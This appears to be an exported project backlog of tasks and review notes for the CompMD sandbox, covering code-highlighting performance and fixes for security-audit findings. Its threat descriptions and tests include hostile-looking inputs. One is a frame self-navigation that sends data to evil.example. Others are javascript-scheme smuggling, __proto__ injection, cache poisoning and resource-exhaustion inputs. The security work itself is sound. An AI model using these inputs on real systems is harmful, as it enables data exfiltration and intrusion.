- `shikiHighlight()` keeps giving a highlighter of its own to a host that calls it itself; its docs say to make one and share it.

## Tests
- Unit: two highlighters from `framesHighlight` of one base share one Shiki (it is made once); a language is loaded once for both.
- Browser (Chrome and WebKit, host mode): two views with code blocks are both highlighted, light and dark, as today.
- Measured with the spike's page (`today` against a variant that goes through the sandbox's own highlighter, if the page needs one): the numbers in the task's note.

notes.text: CR-10: One highlighter for a page’s views
Approved: Approved by the maintainer (CR-10).
One highlighter for a page’s views: WebKit’s skim from 4.2 s to 0.8 s blocked.

tasks.name: Code highlighting: Oniguruma where the page allows WebAssembly (host mode)
tasks.description:
WebKit's cost in highlighting is Shiki's JavaScript engine compiling a grammar's regexes the first time each runs: a 1.1 s frame for the first TypeScript block, and later long frames as new rules first match. With Oniguruma, as WebAssembly, the first tokenizing takes 30 ms and nothing after it is long: with one Shiki for the page, 83 ms blocked on opening and 10 ms over a skim, where the JavaScript engine has 1.2 s and 0.9 s (the spike CMD-252, [its README](spikes/highlight-perf/README.md), *shared + oniguruma*). In Chromium the two are as fast.

## Change
- In host mode the shared Shiki (the task before this one) uses Oniguruma (`@shikijs/engine-oniguruma`) when the page can compile WebAssembly, and the JavaScript engine, as today, when it can't: a page whose policy has no `'wasm-unsafe-eval'` refuses it, and highlighting must still work there.
- The WebAssembly ships once, with the frames' files beside `highlight.js` (622 KB, 232 KB gzipped), loaded with the first code block; the site's check that Shiki ships once covers it.
- `@compmd/vite`'s `cspFor` (`npm-packages/vite/src/csp.ts`) adds `'wasm-unsafe-eval'` to the host page's `script-src`, so a host that takes its policy from it gets Oniguruma; the docs say what it allows (compiling WebAssembly, in the host's own page, which runs the host's own code) and that a host may leave it out.
- **The frames stay on the JavaScript engine:** their policy refuses WebAssembly, and whether it should allow it is a design of its own (its own task).

## Tests
- Unit: the engine chosen when WebAssembly compiles and when it is refused.
- Browser (Chrome and WebKit, host mode): code highlighted under a policy with `'wasm-unsafe-eval'` and under one without, the same tokens.
- `cspFor`'s tests; the hosting check and the Tauri example still pass (`cargo make tauri-check`).
- Measured with the spike's page, before and after, in the task's note.

notes.text: CR-14: Oniguruma in host mode, where the page allows WebAssembly
Approved: Approved by the maintainer (CR-14).
Oniguruma in host mode where the page compiles WebAssembly; WebKit opening from about 1.2 s to 0.25 s blocked.

tasks.name: Design: WebAssembly in the frames, for code highlighting
tasks.description:
In frame mode the page's frame highlights its own code blocks, with Shiki's JavaScript engine, which in WebKit blocks for about a second on the first TypeScript block (the spike CMD-252, [its README](spikes/highlight-perf/README.md)). Oniguruma, as WebAssembly, doesn't; but the frames' policy refuses WebAssembly (`npm-packages/sandbox/build/policy.ts`: no `'wasm-unsafe-eval'`, `worker-src 'none'`), and a strict frame runs code from documents.

## The design
A design document in `docs/`, its decisions first, for the maintainer to decide. It answers:
- What `'wasm-unsafe-eval'` in a strict frame's `script-src` lets a component's code do that JavaScript there can't: against each threat of [the sandbox's design](docs/running-components-in-the-sandbox.md) (T1 to T10), and spec §15's five rules. Stopping a component that runs too long (rule 5, T9) and timing side channels are looked at in particular.
- The alternatives: the host's page tokenizing for its frames and sending tokens (after CMD-251, a highlighter gives tokens), a frame of its own for highlighting, a worker (`worker-src`), or staying with the JavaScript engine in frames, with what each costs and measures (the spike has the worker's numbers).
- What changes in the frames' policies, the protocol and the spec's informative note on browsers, if anything.

No code. Its follow-up tasks are added once it is decided.

notes.text: CR-13: Design: WebAssembly in the frames
Approved: Approved by the maintainer (CR-13).
Design accepted: WebAssembly in the frames; follow-up CMD-260.

tasks.name: Code highlighting: a block a task, those on screen first
tasks.description:
Each code block is tokenized as it renders, so a render with many blocks tokenizes them all in one frame. Tokenizing a block a task, those on screen first, bounds a frame to one block: in the spike CMD-252 ([its README](spikes/highlight-perf/README.md), the *sliced* variants) it took opening's last 83 ms blocked to 0 with Oniguruma, and the JavaScript engine's opening frame in WebKit from 1.2 s to 0.6 s (it can't split one block's first compile).

## Change
- The sandbox's highlighter queues the blocks it is asked for and tokenizes one a task, yielding to the page between them; a block on screen goes before one that isn't, and a block whose text changed or that is gone is dropped from the queue.
- After CMD-251 a highlighter gives tokens and the renderer draws them, so the queue is the highlighter's own and the renderer needs no change.
- A view's `settled` still waits for its blocks' highlighting, as today.

## Tests
- Unit: the order (on screen first), one block a task, a dropped block; a block of a newer text isn't drawn with older tokens.
- Browser tests of code blocks as today, both modes.
- Measured with the spike's page, before and after, in the task's note.

notes.text: The queue can’t be the highlighter’s: since CMD-251 a highlighter gets only (code, language), not the block, so it can’t know what is on screen or gone. Proposed: the renderer queues the blocks of a document and asks the highlighter for one at a time, waiting for its tokens and drawing them before the next, a task apart; blocks an IntersectionObserver reports on screen first (no layout read); a changed or removed block dropped. Works for any highlighter, no contract change. OK? → Yes: the renderer queues the blocks, one at a time, on screen first by an IntersectionObserver, changed or removed blocks dropped; no contract change.; Highlighting isn’t part of settling today (drawn() doesn’t wait for it). Should a page’s drawn(), and so a view’s settled, now wait for its blocks’ tokens? Proposed: yes, so tests, printing and scrolling to a link see highlighted code. → Yes: drawn(), and so settled, waits for the blocks’ tokens.

Approved: Approved by the maintainer (CR-15).
A block at a time, on screen first; drawn() waits for highlighting. WebKit with Oniguruma: opening 84 ms blocked, skim 8 ms.

tasks.name: Code highlighting: Oniguruma in the frames
tasks.description:
Builds [WebAssembly in the frames](docs/webassembly-in-the-frames.md) (accepted, decision 2 revised 2026-11-19): the frame documents allow compiling WebAssembly, and the highlighter uses Oniguruma except in Chromium, in the frames and in a host-mode page alike.

## Change
- `'wasm-unsafe-eval'` in both frame documents' `script-src` (`common` in `npm-packages/sandbox/src/build/policy.ts`), and nothing else in their policies; `policy.test.ts` says so.
- **One rule for the engine** (`npm-packages/sandbox/src/highlight/highlight.ts`, `engineFor`): the JavaScript engine in Chromium, told by `navigator.userAgentData` (only Chromium's browsers have it; never the user agent string); Oniguruma elsewhere, where the page compiles WebAssembly; the JavaScript engine where it doesn't. The frames' runtime and `framesHighlight` both use it; `shikiHighlight({ webAssembly })` keeps its meaning for a host that calls it itself, with the same rule.
- Spec §15's informative note on browsers gains one line: the frames allow WebAssembly, which reaches no more than their scripts; with its changelog entry under *Unreleased*. No rule changes.
- The sandbox's design (`docs/running-components-in-the-sandbox.md`, Q3's table) names `'wasm-unsafe-eval'` in the first policy; the sandbox's README says which engine runs where.

## Tests
- Unit: the engine for each of Chromium, another browser, and a page that refuses WebAssembly.
- Browser (Chrome and WebKit): a strict component that compiles and runs WebAssembly given `fetch` reaches no origin (T1); the frames' code blocks highlighted, light and dark, as today; the engine each browser runs (JavaScript in Chrome, Oniguruma in WebKit).
- Measured on the spike's page: frame mode's first block in WebKit, before and after.

The cost per frame is measured already (the design's open point 1, 833e565).

Go on with A (frame mode has one frame per document), switch to B (the host’s page tokenizes for its frames), or A now with B as a task? → The JavaScript engine in Chromium (told by navigator.userAgentData), Oniguruma elsewhere, one rule for frames and host mode; B as CMD-262 in the backlog. tasks.name: Code highlighting: the JavaScript engine's wrong tokens in WebKit
tasks.description:
In CMD-257's browser test (`npm-packages/sandbox/test/highlight-policy.test.ts`), the frames' highlighter with Shiki's JavaScript engine gave wrong tokens in WebKit for one TypeScript block:

```ts
export async function load(url: string): Promise<number> {
  return (await fetch(url)).status; // done
}
```

Its light theme's colours disagreed with its dark theme's on the same tokens (`Promise` `#005CC5` in the light theme, a constant's colour, where the dark theme gave a type's, `#B392F0`; `return` and `await` a function's colour), and some tokens were split differently (`(url)).status; ` as one token). Oniguruma's tokens were right, in WebKit as in Chromium, and the JavaScript engine's were right in Chromium. Seen in one run; not looked into.

The frames highlight with the JavaScript engine until CMD-260, and a host-mode page whose policy refuses WebAssembly does always, so their code may show in wrong colours in WebKit.

## To do
- Reproduce it: the block above, with the JavaScript engine, in WebKit, in a test; find whether it is the same each time, or depends on what was tokenized before (the two themes are tokenized one after the other).
- Find the cause: a grammar pattern the forgiving engine turns into a regex WebKit runs differently, or the engine's own state between runs.
- Fix it where it is ours, or report it upstream (Shiki, or WebKit) with the smallest case, and record what was found here.

## Tests
A browser test in WebKit and Chrome: the JavaScript engine's tokens for the block above are Oniguruma's.

tasks.name: Sandbox: the host gives the code highlighter, in both page modes
tasks.description:
Build the sandbox's highlighter option as CMD-267's design decides: the host gives the code highlighter, in both page modes, and Shiki stays the default.

## Change
- **The option** on the sandbox: in host mode a function, `(code, language) => lines`, as the renderer's `CodeHighlighter`.
- **Frame mode:** a frame sends a block's text to the host's page, which highlights it with the host's highlighter and sends the tokens back, in the frame protocol's next version. The host's page answers only blocks of trees it sent that frame.
- **What stays:** a block shows its text until its tokens come, and keeps it for a language the highlighter doesn't cover, on a failure, and when the host doesn't answer in time; `settled()` waits for highlighting.
- **Without the option**, nothing changes.
- The release notes: the frame protocol's new version, so a host's page and the frames it serves are upgraded together.

## Tests
Both modes, light and dark; a language the highlighter doesn't cover; a rejected promise; `settled()` waiting for the tokens; a frame asking about a block it wasn't sent gets nothing; a host that never answers leaves the text; and the pages without the option highlighted as before. In Chrome and WebKit.

Replaces the earlier scope of this task (the host's page tokenizing for its frames, alternative B of [WebAssembly in the frames](docs/webassembly-in-the-frames.md)): whether the default Shiki moves to the host's page too is CMD-267's to decide.

Release CompMD 0.8.0 as [releases](docs/releases.md) and `RELEASING.md` say: every npm package and the crates at one version. A minor version, since it breaks (below).

tasks.name: Images in a component's frame: a zoom, a lightbox, a before-and-after slider
tasks.description:
A strict frame's policy loads images only from `data:` and `blob:` (spec §15, rule 2), so a component written in code can't show an image the document links: a zoom, a lightbox or a before-and-after slider ([the first components](docs/first-components.md), G1). `compmd` definitions (`figure`, the card gallery) need none of this: their images are the document's own.

## Questions
- **How the images reach the frame:** the host hands them in already loaded (as `blob:` URLs, or the slot's items' elements), or the frame's policy allows the document's own origin for images, or the pack's.
- **What each way gives a component:** can it read a document's image it wasn't given (another post's, a private one)? Remote images stay the reader's to allow (§15, *Privacy*); how that answer carries into the frame.
- **Both page modes** (frame and host), and what the renderer already does for remote images ([remote images](docs/remote-images.md)).

## Do
A design note, decisions first, with a spec change if one is needed, reviewed with the user; then the zoom or the slider built on it, with tests in Chrome and WebKit. Found while testing the first image components (CMD-11).

tasks.name: Design: the host's code highlighter, in both page modes
tasks.description:
A design, decisions first, reviewed with the user before CMD-262 builds it: the sandbox takes the code highlighter from its host, in both page modes, with Shiki staying the default.

## Why
- A host whose editor highlights with its own engine (Lezer, for one) wants the same colours in its rendered pages, and languages Shiki doesn't ship.
- WebKit's cost: about a second on a first TypeScript block with the JavaScript engine, 60 ms with Oniguruma plus its 230 KB chunk, and about 85 ms per frame to compile Oniguruma (the open point of [WebAssembly in the frames](docs/webassembly-in-the-frames.md)).
- Today the renderer takes tokens from any highlighter (`CodeHighlighter`), but the sandbox has no option: its frames and host-mode pages always use its own Shiki, and only `createPage` lets a host choose, without the sandbox.

## Decide
- **The option:** its name and type; in host mode a function, `(code, language) => lines`.
- **Frame mode, (b):** the frame sends a block's text to the host's page, which highlights it and sends the tokens back; only data crosses, and the frames' code stays fixed. Why not (a), a highlighter module the host names by URL, loaded into the frames.
- **The messages** of the frame protocol's next version: a frame's request for a block's tokens and the answer; the host's page answers only blocks of trees it sent that frame, as it does for images, so a frame can't make it tokenize anything else.
- **A host that never answers:** a time limit, after which the block keeps its text, so `settled()` doesn't hang.
- **The threats:** grammars running on untrusted text in the host's realm (as in host mode already), a frame's highlighting waiting on the host's thread, tokens that aren't the block's text (the renderer keeps the text).
- **Shiki as the default, explained in full with examples, comparisons and measurements:** the default staying in each frame (as today) against the default moving to the host's page through the same messages. For each: what a page of one frame, of ten and of many frames costs in Chrome and WebKit (first block, a page's worth of blocks, memory), what each frame then needs (`'wasm-unsafe-eval'`, the 230 KB chunk), and worked examples of a page in each mode. Measured, as the [highlighting spike](spikes/highlight-perf/README.md) measured, not estimated.
- Batching blocks in one round trip, if the measurements ask for it.

## Result
A section of [the frame protocol](docs/sandbox-protocol.md) and of [running components in the sandbox](docs/running-components-in-the-sandbox.md) (or a design of its own, linked from both), reviewed with the user.

tasks.name: Design: closing the sandbox's boundary gaps
tasks.description:
Settle, with the maintainer, how the sandbox closes the gaps of [the audit](docs/codebase-audit.md) S1, S2, S3, S16, S17, S18, B7 and B8, then write the decisions into [the sandbox's design](docs/running-components-in-the-sandbox.md) and [its protocol](docs/sandbox-protocol.md) before any code changes. The points are coupled: what a frame is sent depends on who it is for, and when a frame is believed depends on how it was made.

## Points to settle
- **S1, a frame that navigates itself:** the parent says hello only for a load it started; any other `load` fails the frame and shows the fallback. Whether the host page's `frame-src` becomes a stated requirement, and whether `runCheck` probes it.
- **S2, code per pack:** `ComponentCode` carries its pack (or a trust key), and a permissive frame gets only its own pack's permissive code plus strict code; another pack's permissive component there is `not-here`.
- **S3, B8, correlation:** compile, image and host requests matched by numeric id, with a timeout each; a superseded request is rejected; only a matched answer is cached.
- **S16, frame mode's `set`:** own keys only, and whether a page frame may set any document input or only bound ones.
- **S17, `link`:** checked with `safeUrl` in the parent, and the docs say its URL and timing are untrusted.
- **S18:** whether a frame refuses to start unless `self.origin === "null"`, and whether the `sandbox` header becomes a MUST.
- **B7:** trust and print keyed by a component's entry (example scope included), not its name.
- **B8:** one reload rule for page, use and compile frames; a version mismatch answered so the parent reports `version`.

## Done when
The design and the protocol doc lead with these decisions, the protocol doc's message tables match `src/protocol/messages.ts` (audit I1), and the follow-up tasks below match what was decided (update them with `atm task edit`).

notes.text: CR-121: Closing the sandbox boundary gaps: the decisions

tasks.name: Decide the audit's spec questions
tasks.description:
Five findings of [the audit](docs/codebase-audit.md) need the spec to say something it doesn't. Settle each with the maintainer, then change the spec (with its changelog entry under `### Unreleased` and conformance cases), or record why not.

- **A release's own name (S4, processor side):** a processor refuses a pack release whose `package.json` `name` isn't the imported pack's name (§6.4), so a release can't arrive under another pack's name.
- **A nesting limit (S9):** a maximum depth for the document tree and for expansion, with a diagnostic, so a deep document is refused instead of overflowing the stack (§8.5 says expansion always terminates).
- **W109 (S28):** §8.1 says interpolation never produces a URL's scheme, but its second sentence checks only a URL that starts with one; `[x](java{{md.input.s}})` gets no warning.
- **Work, not only nodes (S5):** whether F034's limit counts iterations and invocations as well as nodes made (§8.5).
- **Authors' classes and ids (S31):** whether `class` and `id` params stay as written on the host's page, or are prefixed or filtered (§15).

## Done when
Each point is in the spec or recorded as declined, and the processor tasks that depend on it say what was decided.

tasks.name: Sandbox: a frame that navigates itself is failed, not admitted again
tasks.description:
Audit S1 and B8 ([the audit](docs/codebase-audit.md)), as [the sandbox's design](docs/running-components-in-the-sandbox.md), decision 10, and [its protocol](docs/sandbox-protocol.md), decision 5, now say (CMD-269, revised with the maintainer while starting this task).

A strict frame can navigate itself (`location.replace("https://evil.example/?" + data)`). The data in the URL is stopped only by the host page's `frame-src`. What the sandbox must stop is admitting what loads next: `frameUse` says hello on every `load` (`npm-packages/sandbox/src/use.ts`), so the foreign page is given a port, the code, the part with the document's inputs, and `host`. The page and compile frames say hello once (`pages.ts`, `host/runtime.ts`), so they admit nothing, but a second load leaves them hung until the ping's timeout.

## Decided
- A parent says `hello` only after a load it started, by giving the frame its `src`.
- **A use frame**, on a load it didn't start (a self-navigation, or its element moved, which the parent can't tell apart), gives nothing to what loaded and sets its `src` again, then connects after that load as today. Three such loads within 10 s fail the frame: removed, its fallback shown (W118). (Not "with no `ready` between them", as first written: a restarted frame says `ready` before its code navigates again, so that never stops a loop.)
- **The page and compile frames** are greeted once. A second load fails them at once, with an error. No replay.
- A frame whose `ready` names another sandbox version is reported with the reason `version`, not as unloaded.
- The host's page MUST have `frame-src` naming the frames' origin (docs/hosting.md, decision 10), and `runCheck` probes for it.

## Change
- A small helper that makes a frame (the `sandbox` and `allow` attributes) and tells a load it started from any other, used by `frameUse`, `framePage` and the compile frame.
- Reloads no longer leak a channel and a `serveHost` listener in `#frameEvents`.
- The `version` reason; `runCheck`'s self-navigation probe.

## Tests
Browser tests in Chrome and WebKit:
- a strict use frame that navigates itself gets no second hello on what loaded, and is back on its own document; one that keeps navigating shows its fallback;
- a use frame whose element is moved boots again and draws;
- a page frame that navigates itself fails with an error;
- `runCheck` fails on a page without `frame-src`.

notes.text: CR-122: A frame that navigates itself is not admitted again
Approved: in CR-122 (round 1)
Approved in CR-122: only a load the parent started is greeted; a use frame is reloaded, failing after three in 10 s; page and compile frames fail at once; runCheck probes frame-src.

tasks.name: Sandbox: a permissive frame gets only its own pack's code
tasks.description:
Audit S2 and B7 ([the audit](docs/codebase-audit.md)), as [the sandbox's design](docs/running-components-in-the-sandbox.md), decision 10, and [its protocol](docs/sandbox-protocol.md), decision 7, now say (CMD-269).

`HostRuntime.#frame` gives a frame `codeFor(this.#code, level)`, every component at or below its level, and the frame imports all of it (`npm-packages/sandbox/src/frame/runtime.ts`). So a document using permissive packs A and B runs B's code in A's frame, with A's network and `host`, against spec §15. Trust and print are also keyed by name only (`host/runtime.ts` `set`), so a document's `chart` and an example's `chart` overwrite each other.

## Decided
- `ComponentCode` carries its `pack`. Protocol version 4, with CMD-273's ids.
- A permissive frame is sent its own pack's permissive code and the strict code. Another pack's permissive component there comes without code, and its uses render as `not-here`.
- Trust and `print` are keyed by the component's entry (`entryOf`), as its code is.

## Change
As decided, in `host/runtime.ts`, `frame/runtime.ts`, `mounts.ts` and `protocol/messages.ts`, with `protocol.schema.json`.

## Tests
- Two permissive packs with different `network`, used in one document: each frame loads only its own pack's module (a module's top level that records where it ran), and B's use in A's slot shows its fallback as `not-here`.
- A document `chart` and an example `chart` of different trust each keep theirs.

Approved: in CR-123 (round 1)

tasks.name: Sandbox: requests matched to their answers by id, with a timeout
tasks.description:
Audit S3 and B8 ([the audit](docs/codebase-audit.md)), as [the sandbox's protocol](docs/sandbox-protocol.md), decision 6, now says (CMD-269, narrowed with the maintainer while starting this task).

`connectCompiler` kept pending requests by component name (`npm-packages/sandbox/src/protocol/compiler.ts`). A document and one of its examples can define a component of one name, and both are compiled at once. One request then got the other's code, which `compiledWith` cached under the wrong source's key, and the other never settled, so the view never rendered. The compile frame also had no timeout after `ready`.

## Decided
- `compile`, `compiled` and `failed` carry an `id`, the host's own count (protocol version 4, with CMD-272's `pack`). An answer settles only the request with its `id`, and one with no request waiting is dropped.
- A compile not answered within 30 s of the host's awake time fails, and its component's uses show their fallbacks. The compile frame isn't pinged: this stands for it.
- **Not done, as first written, since it fixes nothing ids on compiles don't:**
  - ids on `image` and `fetched`: the same URL wants the same file, and only the host's page answers;
  - a newer request rejecting an older one;
  - a shared request/answer helper, which would have had one user.
- `host` calls (`host-api.ts`) are already matched by id and get no timeout.

## Tests
- Two compiles of one name each get their own code, answered out of order.
- An answer with an unknown `id` is dropped.
- A compile that never answers fails after the timeout.
- A document and an example defining one name both render, in frame and host mode.

notes.text: CR-124: Compile requests matched by id, with a timeout
Approved: in CR-124 (round 1)
Approved in CR-124: compile requests matched by id, each failing after 30 s; protocol version 4.

tasks.name: Sandbox: every message from a frame checked by one table
tasks.description:
Audit S16, S17 and the shape checks of S28 ([the audit](docs/codebase-audit.md)), as [the sandbox's design](docs/running-components-in-the-sandbox.md), decision 10, and [its protocol](docs/sandbox-protocol.md), decision 7, now say (CMD-269, narrowed to the threats while starting this task).

## Decided
- **`set`, frame mode included:** only an input that is an own key of the document's inputs (`Object.hasOwn`) and that some use in the trees and splices sent binds (`PageInputs`), as host mode checks a use frame's `set`. Before, it was `input in inputs` (`npm-packages/sandbox/src/pages.ts`).
- **`link`:** a string, through `safeUrl(url, schemes)` in the parent (`protocol/parent-end.ts`); `@compmd/render` exports `safeUrl`. `ViewEvents.link`'s doc says the URL and its timing come from the frame's code, so the host shows the reader the URL before anything opens.
- **`pong`:** a whole number with `answered < n <= sent`.
- **`error`, `rendered`, `size` and `serveHost`'s calls** checked before use, and a reported size kept from 0 to `MAX_SIZE`.
- **Not done, as first written:** one guard table per direction, with the unions and `isMessage` derived from it (audit A1). It tidies the code but fixes no threat: each message is checked where it is read.

## Tests
From a fake frame's port:
- `set` of `__proto__` is refused, and so is a page frame's `set` of a declared input no use binds;
- `link` with `javascript:` is dropped;
- `pong {n: Infinity}` doesn't stop a hung frame being reported;
- a malformed `error` reaches no host callback.

notes.text: CR-125: What a frame sends is checked before the parent acts on it
Approved: in CR-125 (round 1)
CR-125 approved: every message from a frame is checked by one table before the parent acts on it.

tasks.name: Sandbox: the image gate decides on the image's resolved origin
tasks.description:
Audit S15 and the `allow-origin` point of S28 ([the audit](docs/codebase-audit.md)).

`ImageGate.decide` takes `//tracker.example/p.png` as relative (`urlScheme` gives `undefined`, `npm-packages/sandbox/src/image-gate.ts`), so it shows without the reader being asked, and the frame fetches `new URL(src, base)`. `PageImages.allowOrigin` has the same gap. A frame's `allow-origin` also forgets the reader's stored answer before asking again.

## Change
One function decides an image's origin from `new URL(src, base)` and compares it with the base's; `decide`, `allowOrigin` and the fetch all use it. A frame's `allow-origin` asks without forgetting a stored answer, or is rate-limited per origin (the reader's own button still forgets).

## Tests
`//host/x.png`, `\\host/x.png` and `/\host/x.png` on another origin are asked about; a same-origin relative image isn't; a frame repeating `allow-origin` doesn't erase a stored deny.

tasks.name: Sandbox: the frame runtime starts only in a sandboxed frame
tasks.description:
Audit S18 ([the audit](docs/codebase-audit.md)), as [the sandbox's design](docs/running-components-in-the-sandbox.md), decision 10 and Q3, and [hosting](docs/hosting.md), H2, now say (CMD-269).

The frame runtime believes its parent (`npm-packages/sandbox/src/frame/runtime.ts`, the hello listener). Served without `Content-Security-Policy: sandbox allow-scripts`, any site can embed `strict.html` without a `sandbox` attribute and run code in the origin that serves it. GitHub Pages ignores `_headers`, so the project's own site serves the frames that way.

## Decided
- The frame runtime refuses to start unless `self.origin === "null"`, whatever headers served it.
- Where the host can set headers, it MUST serve the frame documents with `Content-Security-Policy: sandbox allow-scripts`. The runtime's check is what holds where it can't, such as Pages.

## Change
- The runtime check, saying why in the console.
- The sandbox README and the hosting guide make the header a MUST where headers can be set.
- `runCheck` reports a frame document served without the header.
- The website keeps its frames on Pages, safe by the runtime's check. Whether it moves them to a host that honours `_headers` is a follow-up task, if wanted.

## Tests
- A frame document loaded in an iframe without `sandbox` doesn't answer hello.
- The existing frames still start.

notes.text: CR-126: The frame runtime starts only in a sandboxed frame
Approved: in CR-126 (round 1)
CR-126 approved: the frame runtime starts only in a sandboxed frame.

tasks.name: Registry: a pinned import gets only its own pack's cached release
tasks.description:
Audit S4 and I6 ([the audit](docs/codebase-audit.md)).

For a pinned import the resolver takes cached files by integrity alone (`npm-packages/registry/src/resolve.ts`, `#resolveFrom`), and the cache is keyed by integrity only (`cache.ts`). So a document can pin `@trusted/charts@1.0.0` to the integrity of an `@evil/pack` release another document cached, and get its files as `@trusted/charts`, with that pack's trust and without the deny, size and registry checks. The processor's side (a release's own name) is a spec question in the spec decisions task.

## Change
Cache entries are keyed, or tagged, by `pack@version` as well as integrity, and a hit is used only for the same pack and version; the cached path applies `denied` and `#refusal` as the fetched one does.

## Tests
Two packs: one cached; a pinned import of the other with the first's integrity is not given its files; a pinned import of the same pack and version still uses the cache.

Approved: in CR-85 (round 1)

tasks.name: Registry: a tarball's intake bounded from fetch to files
tasks.description:
Audit S10, S11, S12 and A9 ([the audit](docs/codebase-audit.md)).

- `untar` loops forever on a negative octal size (`npm-packages/registry/src/tar.ts`): an entry of size `-1024` moves the offset back.
- Only the registry's declared `unpackedSize` is checked; the download (`registry.ts` `tarball`) and the gunzip are read whole.
- A tarball URL from the metadata is fetched on any origin with the registry's headers (`registry.ts`, `proxy.ts`): a token can go to another host, and a server-side proxy fetches any address.

## Change
One bounded pipeline: fetch with a byte cap, hash, gunzip with a cap, untar with sizes that are non-negative integers and an offset that always advances. Tarballs only from the registry's origin (or headers only there), and `https:`.

## Tests
A tar with a negative size, one whose gzip expands past `maxPackSize`, one larger than declared, and metadata naming a tarball on another origin are each refused with a message; a normal pack still resolves.

Approved: in CR-88 (round 1)

tasks.name: Processor: expansion counts work, not only nodes made
tasks.description:
Audit S5, S8, the slot point of B8's list, R2 and A7 ([the audit](docs/codebase-audit.md)), as §8.5 now says (CMD-270).

Only `Expander::made` counts against the limit (`crates/processor/src/expand.rs`), so `each` loops and `display=contents` invocations that make no node never stop: five nested `each` over 100 items run 10^10 times. Each example has its own limit (`processor/examples.rs`), so N examples give N times the limit. Slot placement loops a template without `expanding` (`expand/text.rs`).

## Decided (§8.5, "Work")
- A work limit separate from the 100,000 nodes: every processor does up to 1,000,000 iterations of `each` and template slots and invocations of components in one expansion; beyond, F034 at the `each`, template slot or invocation that crossed it, recovered as F034 is today.
- Examples count toward their document's limits (nodes and work), not limits of their own.

## Change
One `iterate` helper for `each`, `rendered_slot` and `slot` that charges each iteration, and a charge per invocation in `expanding`, against the work limit, reported as F034. Examples get what remains of the document's limits and count against them.

## Tests
Nested empty `each` loops and a doubling chain of `display=contents` definitions end with F034 quickly; many examples together hit the limit; existing F034 cases still pass; a conformance case for the work limit.

notes.text: CR-119: Expansion counts work, not only nodes made
Approved: in CR-119 (round 1)
Approved in CR-119: a work limit of 1,000,000 iterations and invocations, examples sharing their document limits, and a limits key for conformance cases.

tasks.name: Processor: CEL charges a value's cost before building it
tasks.description:
Audit S6, the `in`/`==` point of S28, and A7 ([the audit](docs/codebase-audit.md)).

The evaluator spends for a built string or list only after the call returns (`crates/processor/src/cel/eval.rs`, `built`), so `'a…'.replace('a', 'a…')` with 40,000-character strings allocates 1.6 GB before the budget error. A string literal costs one step whatever its length; `in` and deep `==` cost one step whatever the size.

## Change
An overload can say its result's size from its arguments (`replace`, `join`, `split`, `+`, `md.list`), and the evaluator spends that before calling; literals are charged by length; `contains` and `equals` by elements visited.

## Tests
The large `replace`, `split('').join(x)` and a quadratic `filter(r, r in rows)` each end with the budget error without a large allocation; the differential tests still agree.

notes.text: CR-86: CEL spends for a value before building it
Approved: in CR-86 (round 1)
Approved in CR-86: CEL spends for sized results before building them; literals by length; comparisons by values visited.

tasks.name: Processor: the name suggestion bounded
tasks.description:
Audit S7 ([the audit](docs/codebase-audit.md)). `distance` builds a full `|a| × |b|` matrix (`crates/processor/src/nearest.rs`), and names have no length limit, so two 50,000-character names ask for about 20 GB; the "close enough" filter runs after the distance.

tasks.name: Processor: what the spec decisions settled
tasks.description:
Build what the spec decisions task (CMD-270) put into the spec ([the audit](docs/codebase-audit.md) S4 processor side, S9, S28 W109, S31).

- **A release's own name (§6.4):** a release whose `package.json` `name` isn't the imported pack, or whose `version` is outside the import's version, is F026 with the reason, where `crates/processor/src/resolve/load/packs.rs` checks `export.pack` today.
- **A nesting depth (§8.5, F038, new):** blocks nested deeper than 100 (containers, quotes, list items) are F038 at parsing, in `Converter::blocks` (`parse/blocks.rs`), the block that crossed it rendered as plain text; invocations nested deeper than 100 are F038 at evaluating, with a depth carried in `Expander::expanding`, the invocation rendering its fallback. Add `Code::F038`, its stages, move its row in the Developer's Guide's chapter 22 from "In the catalogue, not reported" to the `parse` and `evaluate` tables, and check that 10,000 nested `> ` markers on one line don't overflow before the converter sees them (the `markdown-rs` fork).
- **W109 (§8.1):** warn whenever an interpolation comes before a URL's first `:`, `/`, `?` or `#` as written and the result isn't relative or `https:`, `http:` or `mailto:` (`expand/text.rs` `checked_url`). A written scheme before the interpolation (`app:notes/{{id}}`) is checked as a written URL.
- **Classes and ids (§15):** stay as written; nothing to change in the processor. The renderer's docs for hosts (`npm-packages/render`) say to render into an area the host's own styles don't reach, as §15 now says.

## Tests
Conformance cases for F026 (a release under another name), F038 (blocks and invocations) and W109 (`[x](java{{md.input.s}})`, and `app:notes/{{id}}` not warned); unit tests for 10,000 nested `> ` markers.
